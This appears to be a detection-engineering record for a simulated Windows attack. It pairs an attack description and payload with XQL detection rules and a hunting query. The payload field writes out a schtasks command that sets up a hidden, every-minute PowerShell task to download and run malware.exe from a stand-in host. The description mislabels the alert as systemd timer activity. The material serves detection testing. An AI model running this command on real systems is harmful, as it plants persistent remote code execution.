identity.description: An attacker creates a malicious scheduled task using schtasks to execute a payload, which triggers a CortexSim alert for Suspicious systemd timer activity. The attack involves creating a task that executes a command via a remote C2 server.

payload.code: schtasks /create /sc minute /mo 1 /tn "UpdateService" /tr "powershell.exe -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri http://192.0.2.100/malware.exe -OutFile C:\\temp\\malware.exe; C:\\temp\\malware.exe\""

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Suspicious Scheduled Task Creation
biocs.description: Creation of a scheduled task with hidden PowerShell execution
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'schtasks.exe'
| filter actor_process_image_name = 'cmd.exe'
| filter action_file_path contains 'malware.exe'

abiocs.name: Suspicious Scheduled Task Execution
abiocs.description: Execution of a scheduled task that downloads and runs a binary from a remote C2 server
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'powershell.exe'
| filter action_file_path contains 'malware.exe'
| filter action_remote_ip = '192.0.2.100'

xql_queries.name: Scheduled Task Creation Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'schtasks.exe'
| filter actor_process_image_name = 'cmd.exe'
| filter action_file_path contains 'malware.exe'
| comp count() by agent_hostname, action_process_image_name
